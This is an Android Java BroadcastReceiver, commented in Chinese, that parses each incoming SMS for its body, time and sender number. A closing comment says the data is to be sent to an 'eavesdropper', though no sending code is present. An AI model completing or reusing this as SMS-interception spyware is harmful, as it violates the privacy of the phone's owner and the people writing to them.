package com.example.registerpageframe;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class SMSBroadcastReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {//intent对象就是短信到来广播意图
		//getExtras取得专门用于存放参数的方法,调用参数名称“pdus”取得短信内容，用对象数组存放短信内容
		Object[] pdus=(Object[]) intent.getExtras().get("pdus");//getExtras取得专门用于存放参数的方法,调用参数名称“pdus”取得短信内容，用对象数组存放短信内容
		for(Object p:pdus){
			byte[] pdu=(byte[])p;//强转成字节数组类型，byte数组是二进制格式
			//smsMessage用于描述短信
			SmsMessage message=SmsMessage.createFromPdu(pdu);//得到短信对象，这样就可以调用message的api取得短信的各个组成部分
			//取得短信内容
			String content=message.getMessageBody();
			//短信接收的时间,new一个日期对象
			Date date = new Date(message.getTimestampMillis());
			//把得到的日期对象转换成字符串的格式2015-03-31 17:58
			SimpleDateFormat format=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			String receiveTime=format.format(date);
			//取得来源地址
			String senderNumber=message.getOriginatingAddress();
			//把数据发送给窃听者
		}
	}

}
